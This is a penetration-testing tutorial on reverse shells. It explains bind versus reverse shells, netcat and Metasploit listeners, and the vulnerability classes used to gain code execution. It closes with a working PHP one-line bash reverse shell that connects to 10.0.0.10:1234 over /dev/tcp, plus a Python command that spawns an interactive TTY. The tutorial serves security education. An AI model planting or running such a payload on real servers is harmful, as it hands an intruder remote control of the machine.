
A  shell  is a user interface that allows access to an operating system’s services, typically using a command line interface (CLI). Penetration testers are often expected to demonstrate the ability to execute commands on a target machine, which means penetration testers often want to gain a  shell  on the target machine. A shell allows the penetration tester to execute commands on a remote machine,  similar to  the way SSH allows a user to execute commands on a remote SSH server.  
Two types of shells exist: bind shell and reverse shells. See Figure 1. We’ll call the machine we are trying to execute remote commands on the  target  and the local machine that we want to enter those commands the  attacker . A bind shell is established when the target is the  server  and the attacker is the client. A reverse shell is opposite, the attacker is the  server  and the target is the client. With a reverse shell, we start a listener (server where we catch the reverse shell) on the attacker’s computer and execute code on the target that forces the target to connect back to the listener.   
Because of firewalls and the near universal use of NAT, an attacker is often constrained to inbound connections to existing ports that already have other services bound to them.  Bind shells also often require whatever user would start the bind shell to have permissions on the target to open a port and listening service. That is typically a limitation that cannot be resolved until the attacker has a foothold on the system. For these reasons, reverse shells are preferred.  
 
  bind-rev shell
Figure 1, Bind and Reverse Shells  
The remainder of this paper focuses on reverse shells. However, the same fundamental techniques used to get a reverse shell apply to bind shells.  
The following requirements must be met to establish a reverse shell:  
The attacker must have a host the target can route packets to  
The attacker must be able to start a  listener  on the host that the target will try to connect to with the reverse shell  
The attacker must be able to execute code or commands on the target  
Let’s start with the first requirement, a host the target can route packets to. Unless the tester already has control of other hosts in the target’s LAN, the attacker will typically require a host with a public facing IP address. Setting up a host with a public facing IP address can be a challenge, but cloud services provide an easy solution. For example, deploying a virtual machine (VM) in Digital Ocean, Linode, Amazon Web Services or Google Cloud Platform is a quick way to start a remote host with a public facing IP address.   
What will not work, at least without setting up port forwarding, is using a computer behind a NAT router or using a VM on your local computer where the virtualization software uses NAT. As will be discussed next, you might want to use Metasploit Framework to set up a listener, so a Kali Linux VM on your local host might be tempting, but you can only catch the reverse shell on a local VM if you can solve the port forwarding issues. A Kali Linux VM on a local computer might be tempting, but it will probably not be a good choice if the target is anywhere else besides also on your local computer.  
The second requirement is the ability to start a listener on the host with the public facing IP address. Two popular tools to create listeners are  netcat  and Metasploit Framework. Metasploit Framework can be used to catch basic http, https or TCP reverse shells, but the real power in Metasploit Framework comes with a Meterpreter shell. However, the Meterpreter payload is heavy and there are fewer options to deliver a Meterpreter payload to the target.  Netcat  is a very flexible alternative to Metasploit Framework.   
There are dozens or hundreds of techniques to spawn a reverse shell (i.e., like  here  and  here ), and almost  all of  these reverse shells can be caught with a simple  netcat  listener. Every penetration tester needs to be comfortable using  netcat . This tutorial focuses  netcat .  
The first two requirements are easy, it’s that last requirement that is the difference between a reverse shell and no reverse shell. The attacker must execute code or commands on the target to spawn a reverse shell. Although there are dozens, or hundreds of ways, to execute code or commands on a target,  every one  them requires the attacker to exploit one or more vulnerabilities on the target. The types of vulnerabilities most useful for this purpose are Remote Code Execution (RCE), File Upload, Path Traversal, Buffer Overflow, and Injection (for example, SQL Injection)  
RCE vulnerabilities exist when an attacker can remotely execute code or commands on a target through some application or service. As an example, consider a remote system administration tool that allows a user to ping a network device through a web application. If an attacker, either an unauthenticated attacker or an attacker who has cracked user credentials to the web application, can execute some command other than ping, they could possibly spawn a reverse shell. Another example of an RCE exploit includes this exploit against  PlaySMS .   
File upload vulnerabilities allow an attacker to upload files with malicious content. With the objective of spawning a reverse shell, the malicious file that is uploaded needs to be of some file type that can be executed. That file could an executable binary or, if the target is a web server, a file that executes within a server-side scripting framework, such as PHP, CGI, or ASP.NET. File upload vulnerabilities are particularly dangerous when the attacker can trigger the payload without user input, but they can also be triggered by an unsuspecting authorized user.  
Path traversal vulnerabilities allow an attacker to navigate through the file system to read files and directories. These vulnerabilities can expose the system to danger by themselves by allowing an attacker to read sensitive data and configuration files, but the attack exposure does not stop at information disclosure. Path disclosure attacks can be used in tandem with other attacks, such as file upload or injection attacks, to execute malicious files on a target system.  
Buffer overflow attacks are a well-recognized vector used by cyber criminals. Developing buffer overflow attacks is not a trivial effort, but a successful buffer overflow attack can allow an attacker to execute arbitrary code on a target system. Although arbitrary code could include a lot of different stuff, shellcode is a particularly dangerous payload that can be included in a buffer overflow attack. Executable shellcode can take as little as 351 bytes, meaning it is not unusual for an attacker to include shellcode in a buffer overflow attack’s payload.  
And last, injection attacks can also be used to spawn a reverse shell. For example, under the right conditions a SQL injection attack could execute a system command or write shellcode to a file  would could  be executed through a web browser, path traversal or other techniques, which could result in spawning a reverse shell.  
Narrowing the Focus: Web Applications  
Most web applications support some type of server-side scripting, such as PHP, CGI or ASP.NET. These features provide significant capabilities that enhance user function, but if they can be abused by an attacker, they also present significant exposure. For example, PHP includes features ( execute( ) and  system( ) )  that allow PHP to execute system commands. These features are useful, but if user input is not effectively controlled it can be abused to execute arbitrary commands of an attacker’s choice. Those arbitrary commands could be useful for collecting valuable system information, or they could be used to execute a bash, Python, Perl, Ruby or another reverse shell.  
Nonetheless, executing this type of attack still requires the attacker to either exploit a  system( ) or  execute( ) command that is already included in an existing PHP page or uploading a PHP page to the file system. If a user can upload a PHP page, or PHP script into an existing PHP page, that contains a reverse shell, that shell can be executed simply by browsing to the PHP page. But, here’s the rub: an untrusted user should not be allowed to upload PHP script to a website. Multiple techniques are used to prevent an untrusted user from uploading PHP script to a website, but implementation errors can expose a site to this type of attack. An attacker might attempt multiple bypass techniques to discover a way to upload and execute PHP script on a web server.  
PHP One-line Bash Reverse Shell  
Here’s a one-line reverse shell that will work on most Linux machines. Because it uses Bash, it will not work on Windows machines, but it is a handy reverse shell. Note, this shell is not interactive. There are other shells that can be used to spawn an interactive terminal once access has been gained with a reverse shell. A Python script that spawns an interactive terminal is also provided.  
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); 
Table 1: PHP One-line Reverse Shell  
python -c 'import pty; pty.spawn("/bin/sh")' 
Table 2: Spawn Interactive TTY  
